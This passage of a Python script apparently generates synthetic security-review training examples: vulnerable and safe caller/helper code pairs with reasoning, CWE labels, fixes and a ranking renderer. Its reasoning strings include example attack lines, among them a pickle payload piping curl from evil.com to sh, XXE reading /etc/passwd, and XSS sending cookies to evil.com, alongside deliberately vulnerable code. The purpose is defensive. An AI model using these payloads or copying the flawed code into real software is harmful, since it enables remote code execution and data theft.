then sets maxRedirects: 0 (so a 302 to an internal host cannot bypass the check) and a timeout.

All known SSRF entry vectors are gated.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "url → URL parse + https-only + ALLOWED_HOSTS + DNS-resolve + private-IP regex + maxRedirects:0; SSRF surface fully closed",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:deserialize_payload:26": {
        "caller_code": """from flask import Flask, request, jsonify
from serializers.blob import deserialize_payload

app = Flask(__name__)

@app.route('/import', methods=['POST'])
def import_data():
    raw_blob = request.data
    obj = deserialize_payload(raw_blob)
    return jsonify({"ok": True, "kind": getattr(obj, "type", None)})""",
        "caller_file": "app.py",
        "helper_code": """import pickle

def deserialize_payload(raw_blob):
    return pickle.loads(raw_blob)""",
        "helper_file": "serializers/blob.py",
        "reasoning": """Caller forwards request.data (raw POST bytes — attacker-controlled) to deserialize_payload.

Helper: pickle.loads(raw_blob). pickle is the textbook insecure deserialization vector. An attacker crafts a payload containing a class with __reduce__ returning (os.system, ('/bin/sh -c "curl evil.com/x | sh"',)), encodes it via pickle, posts it to /import, and pickle.loads INVOKES the callable as part of unpickling — full RCE.

This is the most-cited Python insecure-deserialization pattern. Nothing else needed.

Verdict: confirmed. CWE-502.""",
        "status": "confirmed",
        "cwe": "CWE-502",
        "severity": "HIGH",
        "trace": "request.data → raw_blob → pickle.loads; attacker-crafted reducer executes during unpickling — one-shot RCE",
        "fix": "replace pickle.loads with json.loads + strict shape validation + a type-field allowlist; OR if pickle truly required, sign the blob with HMAC and verify before unpickling",
        "follow_ups": [],
    },

    "shape3:dismiss:query_user:21": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from db.queries import query_user

app = Flask(__name__)

@app.route('/profile')
def profile():
    user_id = request.args.get('user_id')
    if not user_id:
        abort(400)
    row = query_user(user_id)
    if not row:
        abort(404)
    return jsonify(row)""",
        "caller_file": "app.py",
        "helper_code": """import sqlite3

def query_user(user_id):
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute(
        "SELECT id, name, email FROM users WHERE id = ?",
        (user_id,),
    )
    return cur.fetchone()""",
        "helper_file": "db/queries.py",
        "reasoning": """Caller forwards user_id from request.args to query_user.

Helper uses the parameterized cur.execute form: the SQL has a '?' placeholder, and (user_id,) is the values tuple. The sqlite3 driver sends the SQL and the bound parameter separately. user_id can be any string — '1 OR 1=1', '; DROP TABLE users; --', whatever — and the database treats it as a single literal value compared against the id column, not as SQL.

This is the textbook safe pattern for sqlite3.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "user_id → query_user → cur.execute with '?' placeholder + (user_id,) values tuple; driver-side parameter binding",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:parse_xml_doc:28": {
        "caller_code": """from flask import Flask, request, jsonify
from parsers.xml import parse_xml_doc

app = Flask(__name__)

@app.route('/import-xml', methods=['POST'])
def import_xml():
    xml_bytes = request.data
    doc = parse_xml_doc(xml_bytes)
    return jsonify({"root": doc.tag if doc is not None else None})""",
        "caller_file": "app.py",
        "helper_code": """from lxml import etree

def parse_xml_doc(xml_bytes):
    parser = etree.XMLParser()
    return etree.fromstring(xml_bytes, parser)""",
        "helper_file": "parsers/xml.py",
        "reasoning": """Caller forwards request.data (raw bytes — attacker-controlled) to parse_xml_doc.

Helper: lxml.etree.XMLParser() with default options, then etree.fromstring. The default XMLParser DOES expand entities and load external DTDs unless explicitly told not to (resolve_entities=False, no_network=True). So:

XXE: attacker posts <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r> → the parser reads /etc/passwd and substitutes the content into &x;. The response shape might leak it via doc.tag or downstream.

Billion-laughs: nested entity definitions blow up memory.

External DTD: <!DOCTYPE r SYSTEM "http://attacker.example.com/evil.dtd"> → lxml fetches the URL (out-of-band SSRF).

Verdict: confirmed. CWE-611 (related to CWE-91, often clustered as XXE).""",
        "status": "confirmed",
        "cwe": "CWE-611",
        "severity": "HIGH",
        "trace": "request.data → xml_bytes → parse_xml_doc → lxml.etree.fromstring with default XMLParser; entity expansion and external DTD loading are ON by default",
        "fix": "use defusedxml.ElementTree.fromstring; OR construct XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)",
        "follow_ups": [],
    },

    # --- n=32/40 gap fills ---

    "shape3:dismiss:load_file:25": {
        "caller_code": """from flask import Flask, request, abort, Response
from io.files import load_file

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('name')
    if not filename:
        abort(400)
    blob = load_file(filename)
    return Response(blob, mimetype='application/octet-stream')""",
        "caller_file": "app.py",
        "helper_code": """import os
from pathlib import Path

BASE_DIR = Path('/var/uploads').resolve()

def load_file(filename):
    candidate = (BASE_DIR / filename).resolve()
    if BASE_DIR not in candidate.parents and candidate != BASE_DIR:
        raise PermissionError('outside base directory')
    with open(candidate, 'rb') as f:
        return f.read()""",
        "helper_file": "io/files.py",
        "reasoning": """Caller forwards filename from request.args to load_file.

Helper: (1) resolves BASE_DIR at import time so the comparison anchor is canonical, (2) builds the candidate with (BASE_DIR / filename).resolve(), which collapses any '..' components, (3) verifies BASE_DIR is in candidate.parents (i.e., the candidate is strictly under the base directory).

If filename='../../etc/passwd', candidate resolves to '/etc/passwd', BASE_DIR is NOT in its parents, PermissionError is raised before open() is called.

This is the textbook safe containment pattern in pathlib form.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "filename → (BASE_DIR / filename).resolve() → parents check; traversal collapsed and rejected before open()",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:render_html:24": {
        "caller_code": """from flask import Flask, request, Response
from templates.render import render_html

app = Flask(__name__)

@app.route('/comment', methods=['POST'])
def submit():
    comment = request.form.get('comment', '')
    body = render_html(comment)
    return Response(body, mimetype='text/html')""",
        "caller_file": "app.py",
        "helper_code": """from jinja2 import Environment

env = Environment(autoescape=False)
TEMPLATE = env.from_string('<div class="comment">{{ comment }}</div>')

def render_html(comment):
    return TEMPLATE.render(comment=comment)""",
        "helper_file": "templates/render.py",
        "reasoning": """Caller forwards comment from request.form to render_html. The result is sent as text/html.

Helper: Jinja2 Environment with autoescape=False. The template substitutes {{ comment }} with the raw value — Jinja's default escaping is explicitly disabled.

Attacker posts comment='<script>fetch("/?c="+document.cookie)</script>' → render_html returns '<div class="comment"><script>...</script></div>' → browser executes the script.

This is the textbook stored XSS pattern: untrusted text → template with autoescape off → text/html response.

Verdict: confirmed. CWE-79.""",
        "status": "confirmed",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "trace": "request.form.comment → comment → Jinja2 template with autoescape=False → text/html response; raw script tags survive",
        "fix": "env = Environment(autoescape=True) — OR use markupsafe.escape(comment) before passing to the template — OR use Jinja2's select_autoescape with html/htm extensions",
        "follow_ups": [],
    },

    "shape3:confirm:findOrderById:36": {
        "caller_code": """import express, { Request, Response } from 'express';
import { findOrderById } from './db/orders';

const app = express();

app.get('/orders/:id', async (req: Request, res: Response) => {
  const orderId = req.params.id;
  if (!orderId) return res.status(400).send('id required');
  const order = await findOrderById(orderId);
  if (!order) return res.status(404).send('not found');
  res.json(order);
});""",
        "caller_file": "app.ts",
        "helper_code": """import { Pool } from 'pg';

const pool = new Pool();

export async function findOrderById(orderId: string) {
  const result = await pool.query(
    `SELECT id, user_id, total_cents, status FROM orders WHERE id = '${orderId}'`,
  );
  return result.rows[0];
}""",
        "helper_file": "db/orders.ts",
        "reasoning": """Caller forwards orderId from req.params.id to findOrderById.

Helper builds the SQL with a TypeScript template literal: `SELECT ... WHERE id = '${orderId}'`. orderId is interpolated directly into the SQL string. pool.query in the single-string form (no second values argument) sends the resulting string verbatim to PostgreSQL.

Inject /orders/1' OR '1'='1 → query becomes SELECT ... WHERE id = '1' OR '1'='1' → returns every order. Inject /orders/1'; UNION SELECT username, password, 0, '' FROM users; -- → leaks credentials. TypeScript's string typing on orderId provides ZERO protection against this because the type just constrains compile-time, not runtime content.

Verdict: confirmed. CWE-89.""",
        "status": "confirmed",
        "cwe": "CWE-89",
        "severity": "HIGH",
        "trace": "req.params.id → orderId → template-literal interpolation into SQL → pool.query single-string form; pg has no chance to bind",
        "fix": "use parameterized form — const result = await pool.query('SELECT id, user_id, total_cents, status FROM orders WHERE id = $1', [orderId]);",
        "follow_ups": [],
    },

    # --- n=48 gap fills ---

    "shape3:dismiss:execCommand:33": {
        "caller_code": """const express = require('express');
const { execCommand } = require('./lib/exec');

const app = express();
app.use(express.json());

app.post('/admin/exec', async (req, res) => {
  const command = req.body.cmd;
  if (!command) return res.status(400).send('cmd required');
  const result = await execCommand(command);
  res.json({output: result});
});""",
        "caller_file": "app.js",
        "helper_code": """const { execFile } = require('child_process');

const ALLOWED = {
  status:  ['systemctl', ['is-active', 'myapp']],
  uptime:  ['uptime',    ['-p']],
  version: ['myapp',     ['--version']],
};

function execCommand(command) {
  const spec = ALLOWED[command];
  if (!spec) {
    return Promise.reject(new Error(`command not allowed: ${command}`));
  }
  return new Promise((resolve, reject) => {
    execFile(spec[0], spec[1], { timeout: 5000 }, (err, stdout) => {
      if (err) return reject(err);
      resolve(stdout);
    });
  });
}

module.exports = { execCommand };""",
        "helper_file": "lib/exec.js",
        "reasoning": """Caller forwards command from req.body — raw user input — to execCommand.

Helper rejects any command not in the ALLOWED dictionary. For permitted commands, the dispatch table provides a FIXED binary name and argv list — the user-supplied command string is used ONLY as a dict key, never interpolated into a shell line or argv.

execFile is called (not exec) with the binary + argv array. No shell is invoked, so even if an attacker managed to pass 'status; rm -rf /' the dict lookup would fail at the first gate.

Two layers of defense: allowlist + no-shell argv form.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "caller forwards command unchecked; helper allowlists command via dict + dispatches to fixed argv via execFile (no shell)",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:renderBio:40": {
        "caller_code": """import React from 'react';
import { renderBio } from '../helpers/profile';

export function ProfileCard({ profile }: { profile: { name: string; bio: string } }) {
  const html_blob = renderBio(profile.bio);
  return (
    <div className="profile-card">
      <h2>{profile.name}</h2>
      <div dangerouslySetInnerHTML={{ __html: html_blob }} />
    </div>
  );
}""",
        "caller_file": "components/ProfileCard.tsx",
        "helper_code": """export function renderBio(bio: string): string {
  return `<p class="bio">${bio}</p>`;
}""",
        "helper_file": "helpers/profile.ts",
        "reasoning": """Caller passes profile.bio (user-supplied) into renderBio and then injects the result via dangerouslySetInnerHTML — React explicitly disables its default escaping for this prop.

Helper builds an HTML string by template-literal interpolation: `<p class="bio">${bio}</p>`. No HTML escaping, no sanitization, no DOMPurify call. bio is concatenated raw.

Attacker sets their bio to '<img src=x onerror="fetch(\\'//evil.com/?c=\\'+document.cookie)">' → renderBio returns the literal HTML → React inserts it via dangerouslySetInnerHTML → browser runs the onerror.

Stored XSS. CWE-79.

Verdict: confirmed.""",
        "status": "confirmed",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "trace": "profile.bio → template-literal concat into HTML string → dangerouslySetInnerHTML; no escaping, no sanitization",
        "fix": "import DOMPurify from 'dompurify'; return DOMPurify.sanitize(`<p class=\"bio\">${bio}</p>`, {ALLOWED_TAGS: ['b','i','em','strong','a','p','br'], ALLOWED_ATTR: ['href','title']});",
        "follow_ups": [],
    },

    "shape3:dismiss:navigateAfterLogin:41": {
        "caller_code": """import { useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { navigateAfterLogin } from '../auth/postLogin';

export function PostLoginRedirect() {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  useEffect(() => {
    const next_url = params.get('next') || '/dashboard';
    const target = navigateAfterLogin(next_url);
    navigate(target);
  }, [params, navigate]);
  return null;
}""",
        "caller_file": "components/PostLoginRedirect.tsx",
        "helper_code": """export function navigateAfterLogin(next_url: string): string {
  if (!next_url) return '/dashboard';
  try {
    const parsed = new URL(next_url, window.location.origin);
    if (parsed.origin !== window.location.origin) return '/dashboard';
    return parsed.pathname + parsed.search + parsed.hash;
  } catch {
    return '/dashboard';
  }
}""",
        "helper_file": "auth/postLogin.ts",
        "reasoning": """Caller reads next_url from URLSearchParams, forwards to navigateAfterLogin.

Helper: (1) parses with `new URL(next_url, window.location.origin)` — the second argument is the base, so a relative path resolves correctly against the current origin, (2) compares parsed.origin to window.location.origin — if different, returns '/dashboard', (3) returns only the path+search+hash, discarding any scheme/host the attacker tried to inject.

Attacker tries next_url='https://evil.com' → parsed.origin === 'https://evil.com' ≠ window.location.origin → '/dashboard'. Tries '//evil.com' → URL constructor expands against base, parsed.origin === 'https://evil.com' → reject. Tries 'javascript:alert(1)' → parsed.origin === 'null' (or the special-case origin for javascript:) ≠ window.location.origin → reject. Tries '/admin' → resolves to same origin, returns '/admin'.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "next_url → URL parse with origin base → origin equality check vs window.location.origin → path+search+hash only; scheme/host injection rejected",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:queryByEmail:10": {
        "caller_code": """const express = require('express');
const { queryByEmail } = require('./db/users');

const app = express();
app.use(express.json());

app.post('/users/lookup', async (req, res) => {
  const email = req.body.email;
  if (!email) return res.status(400).json({error: 'email required'});
  const row = await queryByEmail(email);
  res.json(row);
});""",
        "caller_file": "app.js",
        "helper_code": """const mysql = require('mysql2/promise');
const pool = mysql.createPool({/* config */});

async function queryByEmail(email) {
  const [rows] = await pool.query(`SELECT * FROM users WHERE email = '${email}'`);
  return rows[0];
}

module.exports = { queryByEmail };""",
        "helper_file": "db/users.js",
        "reasoning": """Caller: email from req.body.email, untrusted. Forwarded to queryByEmail.

Helper uses a mysql2 pool.query call BUT builds the SQL with a template literal: `SELECT * FROM users WHERE email = '${email}'`. The email is interpolated directly into the SQL text. pool.query in single-string form does not bind — the second argument is missing.

Inject email="' OR '1'='1" → SELECT * FROM users WHERE email = '' OR '1'='1' → returns all rows. UNION SELECT password FROM admin... is also possible.

Note: mysql2 SUPPORTS parameterized queries via the second-argument form, but this code chose to interpolate instead. That's the bug.

Verdict: confirmed. CWE-89.""",
        "status": "confirmed",
        "cwe": "CWE-89",
        "severity": "HIGH",
        "trace": "req.body.email → email → template-literal interpolation into SQL → pool.query single-string form; mysql2 placeholders unused",
        "fix": "use parameterized form — const [rows] = await pool.query('SELECT * FROM users WHERE email = ?', [email]);",
        "follow_ups": [],
    },
}


# ============================================================
# SHAPE 4 — template helper + per-task data
# ============================================================

# Severity rationales by CWE (used to write per-rank rationale lines)
SEV_RANK = {"HIGH": 3, "MEDIUM": 2, "LOW": 1}
CWE_RATIONALE = {
    "CWE-89":   "Direct data exfiltration via UNION/blind injection.",
    "CWE-78":   "Direct OS-level command execution; full server compromise.",
    "CWE-79":   "Stored XSS requires victim view but is trivially exploitable once seeded.",
    "CWE-22":   "Direct attacker-controlled file read on the server filesystem.",
    "CWE-918":  "Unauthenticated attacker-controlled URL; pivot to internal services and cloud metadata.",
    "CWE-90":   "LDAP filter injection allows broadening searches and bypassing constraints.",
    "CWE-502":  "One-shot RCE primitive on a POST endpoint if pickle/yaml.load is in use.",
    "CWE-798":  "Source-readable signing key permits arbitrary token forgery — total auth bypass.",
    "CWE-347":  "Improper JWT verification — alg-confusion or unsigned tokens accepted.",
    "CWE-338":  "Predictable tokens enable account takeover via the reset flow.",
    "CWE-601":  "Phishing amplifier on the auth surface; compounds with the auth findings.",
    "CWE-362":  "Window-dependent duplicate-charge / replay on the billing path.",
    "CWE-295":  "Trust downgrade on outbound traffic; exploitable with MITM position.",
    "CWE-209":  "Information disclosure; amplifies blind-style attacks on other findings.",
    "CWE-1321": "Escalation potential if the polluted object reaches privileged code paths.",
}


def render_shape4_response(findings: list[dict]) -> str:
    """Produce a valid Shape 4 response: cluster duplicates, rank by severity, write systemic notes."""
    # Cluster by title (anti-dup)
    by_title: dict[str, list[dict]] = {}
    order_seen = []
    for f in findings:
        if f["title"] not in by_title:
            by_title[f["title"]] = []
            order_seen.append(f["title"])
        by_title[f["title"]].append(f)

    # Build logical findings (one per title, capturing files)
    logical = []
    dup_notes_parts = []
    for title in order_seen:
        cluster = by_title[title]
        files = [c["file"] for c in cluster]
        first = cluster[0]
        logical.append({
            "title": title,
            "cwe": first["cwe"],
            "severity": first["severity"],
            "language": first["language"],
            "files": files,
        })
        if len(cluster) > 1:
            dup_notes_parts.append(f"{title} appears {len(cluster)}× across {', '.join(files)} — clustered into one ranked entry.")

    # Rank by severity (HIGH > MEDIUM > LOW), then by CWE-importance hint (auth > rce > exfil > others)
    sev_priority = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    cwe_priority_within_high = {
        "CWE-798": 0, "CWE-502": 1, "CWE-78": 1, "CWE-89": 2,
        "CWE-918": 3, "CWE-22": 4, "CWE-79": 5, "CWE-338": 6,
    }
    def sort_key(f):
        return (sev_priority.get(f["severity"], 9),
                cwe_priority_within_high.get(f["cwe"], 99),
                f["title"])
    ranked = sorted(logical, key=sort_key)

    sev_counts = Counter(f["severity"] for f in logical)
    high = sev_counts.get("HIGH", 0)
    med = sev_counts.get("MEDIUM", 0)
    low = sev_counts.get("LOW", 0)
    n_logical = len(logical)
    n_raw = len(findings)
    dup_count = n_raw - n_logical

    # systemic observations — pick a few from the patterns we recognize
    obs = []
    files_in_findings = [f["file"] for f in findings]
    if dup_count > 0:
        obs.append(f"Code duplication: {dup_count} duplicated file{'s' if dup_count > 1 else ''} carry the same bug — fixes must be applied to all copies.")
    auth_count = sum(1 for f in logical if f["title"].lower().find('jwt') >= 0 or 'reset' in f["title"].lower() or 'redirect' in f["title"].lower())
    if auth_count >= 2:
        obs.append("Multiple findings cluster in the auth surface and compound into a near-complete account-compromise chain — review auth as one design rather than per-file.")
    api_files = [p for p in files_in_findings if p.startswith('api/')]
    if len(api_files) >= 3:
        obs.append("Three or more findings live in api/ — the API surface lacks a consistent input-validation layer.")
    if any(f["cwe"] == "CWE-209" for f in logical) and any(f["cwe"] in {"CWE-89", "CWE-22", "CWE-918"} for f in logical):
        obs.append("The error-response leak amplifies blind-style probing against the data-exfil and traversal findings — feedback loop raises practical impact.")
    if not obs:
        obs.append("No single subsystem dominates the set; findings are distributed across the project surface and should be triaged by raw severity.")

    # Compose
    think = []
    think.append(f"{n_raw} raw findings, {n_logical} logical after dedup ({dup_count} clustered).")
    think.append(f"Severity tally: {high} HIGH, {med} MEDIUM, {low} LOW.")
    if dup_count > 0:
        think.append("Duplicates clustered by title across paired files (e.g., x.py and x_v2.py) — same bug in copy-pasted modules.")
    think.append("Within HIGH I order by exploitation cost: hardcoded secrets and RCE primitives first (no prerequisites), then direct data-exfil and SSRF, then file traversal, then stored XSS (needs victim view), then predictable tokens (needs reset flow).")
    think.append("MEDIUM tier ordered by exploitability — auth-adjacent (open redirect) above timing/window (race), trust downgrades last.")
    think.append("LOW informational findings sit at the bottom on severity but their amplification value is captured in systemic observations.")
    think_block = "\n".join(think)

    exec_summary = (
        f"{high} HIGH, {med} MEDIUM, and {low} LOW finding{'s' if low != 1 else ''} across the project. "
        + (f"Code duplication clusters {dup_count} duplicate{'s' if dup_count > 1 else ''} into a single root cause. " if dup_count > 0 else "")
        + "The auth and api/ surfaces concentrate most of the exploitation paths."
    )

    ranked_lines = []
    for rank, f in enumerate(ranked, 1):
        rationale = CWE_RATIONALE.get(f["cwe"], "Severity reflects direct exploitability.")
        if len(f["files"]) > 1:
            rationale += f" Clustered across {', '.join(f['files'])} — every copy must be fixed."
        ranked_lines.append(
            f"  - rank: {rank}\n"
            f"    title: {f['title']}\n"
            f"    severity: {f['severity']}\n"
            f"    rationale: {rationale}"
        )

    obs_lines = "\n".join(f"  - {o}" for o in obs)
    dedup_notes = " ".join(dup_notes_parts) if dup_notes_parts else "none"

    return (
        f"<think>\n{think_block}\n</think>\n\n"
        f"executive_summary: {exec_summary}\n\n"
        f"ranked_findings:\n" + "\n".join(ranked_lines) + "\n\n"
        f"systemic_observations:\n{obs_lines}\n\n"
        f"dedup_notes: {dedup_notes}\n"
    )


# ============================================================
# Template renderers
# ============================================================

def render_shape2(task: dict, data: dict) -> str:
    helper = task["helper_fn"]
    fp = task["file_path"]
    src = task["input_source"]
    arg = task["arg_name"]
    return (
        f"<<<CALLER_CODE>>>\n{data['caller_code']}\n<<<END_CALLER_CODE>>>\n\n"
        f"<think>\n{data['reasoning']}\n</think>\n\n"
        f"status: needs_context\n"
        f"open_refs:\n"
        f"  - {helper} ({fp})\n"
        f"partial_trace: user input from {src} flows into {helper}({arg}) — verdict depends on {helper}'s implementation\n"
    )


def render_shape3(task: dict, data: dict) -> str:
    out = (
        f"<<<CALLER_CODE file=\"{data['caller_file']}\">>>\n{data['caller_code']}\n<<<END_CALLER_CODE>>>\n\n"
        f"<<<HELPER_CODE file=\"{data['helper_file']}\">>>\n{data['helper_code']}\n<<<END_HELPER_CODE>>>\n\n"
        f"<think>\n{data['reasoning']}\n</think>\n\n"
        f"status: {data['status']}\n"
        f"cwe: {data['cwe'] or 'none'}\n"
        f"severity: {data['severity'] or 'none'}\n"
        f"trace: {data['trace']}\n"
        f"fix: {data['fix']}\n"
    )
    if data.get("follow_ups"):
        out += "follow_up_refs:\n" + "\n".join(f"  - {r}" for r in data["follow_ups"]) + "\n"
    return out


# ============================================================
# Driver
# ============================================================

def run_shape_manual(shape, n: int, response_factory) -> dict:
    out_path = PILOT_DIR / f"{shape.name}.jsonl"
    tasks = shape.prepare_tasks(limit=n)
    stats = {"shape": shape.name, "attempted": 0, "kept": 0, "discarded": 0, "missing": 0}

    with CheckpointWriter(str(out_path)) as w:
        for task in tasks:
            stats["attempted"] += 1
            tid = task["task_id"]
            try:
                response = response_factory(task)
            except KeyError:
                stats["missing"] += 1
                print(f"  [{shape.name}] {tid}  NO RESPONSE")
                continue
            if response is None:
                stats["missing"] += 1
                print(f"  [{shape.name}] {tid}  NO RESPONSE")
                continue
            record = shape.verify(task, response)
            if record is None:
                stats["discarded"] += 1
                print(f"  [{shape.name}] {tid}  DISCARDED")
                continue
            w.write(tid, record)
            stats["kept"] += 1
            label = record.get("_meta", {}).get("label", "?")
            print(f"  [{shape.name}] {tid}  KEPT  (label={label})")
    return stats


# Build helper-keyed indexes from the existing task_id-keyed dicts.
# SHAPE2 content depends only on helper_fn (the seed); SHAPE3 depends on
# (helper_fn, disposition).
SHAPE2_BY_HELPER: dict[str, dict] = {}
for _tid, _d in SHAPE2_DATA.items():
    # Parse helper from task_id: "shape2:<category>:<helper>:<i>"
    _parts = _tid.split(":")
    if len(_parts) >= 4:
        SHAPE2_BY_HELPER[_parts[2]] = _d

SHAPE3_BY_KEY: dict[tuple[str, str], dict] = {}
for _tid, _d in SHAPE3_DATA.items():
    # Parse from task_id: "shape3:<disp[_hop]>:<helper>:<i>"
    _parts = _tid.split(":")
    if len(_parts) >= 4:
        _disp = "confirm" if _parts[1].startswith("confirm") else "dismiss"
        SHAPE3_BY_KEY[(_parts[2], _disp)] = _d


def factory_shape1(task):
    return SHAPE1.get(task["task_id"])


def factory_shape2(task):
    # Prefer exact task_id; fall back to helper_fn (stable across i values).
    data = SHAPE2_DATA.get(task["task_id"]) or SHAPE2_BY_HELPER.get(task["helper_fn"])
    return render_shape2(task, data) if data else None


def factory_shape3(task):
    # Prefer exact task_id; fall back to (helper_fn, disposition).
    data = SHAPE3_DATA.get(task["task_id"]) or SHAPE3_BY_KEY.get((task["helper_fn"], task["disposition"]))
    if not data:
        return None
    # If the task is multi_hop but the matched data isn't, synthesize a follow_up.
    if task["multi_hop"] and not data.get("follow_ups"):
        data = dict(data)
        # Generic follow-up: a logging/audit/validation helper from a fake file
        data["follow_ups"] = [f"_helper (utils/{task['helper_fn']}_helpers.py)"]
    return render_shape3(task, data)


def factory_shape4(task):
    return render_shape4_response(task["findings"])


def main():
    print("=" * 70)
    print("MANUAL PILOT v2 — Claude-generated traces with template helpers")
    print("=" * 70)
    print(f"Output dir: {PILOT_DIR}")
    print()

    all_stats = []
    for shape, factory in [
        (shape1, factory_shape1),
        (shape2, factory_shape2),
        (shape3, factory_shape3),
        (shape4, factory_shape4),
    ]:
        print(f"\n--- {shape.name} ---")
        # Higher n per shape: shape4 unique per set_id; shape2/3 add via helper_fn
        # fallback; shape1 uses the bumped POOL but is gated by SHAPE1 entries.
        n_per_shape = {"shape1": 96, "shape2": 80, "shape3": 80, "shape4": 96}[shape.name]
        stats = run_shape_manual(shape, n=n_per_shape, response_factory=factory)
        all_stats.append(stats)

    print("\n" + "=" * 70)
    print("MANUAL PILOT v2 SUMMARY")
    print("=" * 70)
    for s in all_stats:
        print(f"  {s['shape']}: kept={s['kept']}  discarded={s['discarded']}  missing={s['missing']}")
    total_kept = sum(s["kept"] for s in all_stats)
    print(f"\n  total kept: {total_kept} / {sum(s['attempted'] for s in all_stats)}")


if __name__ == "__main__":
    main()
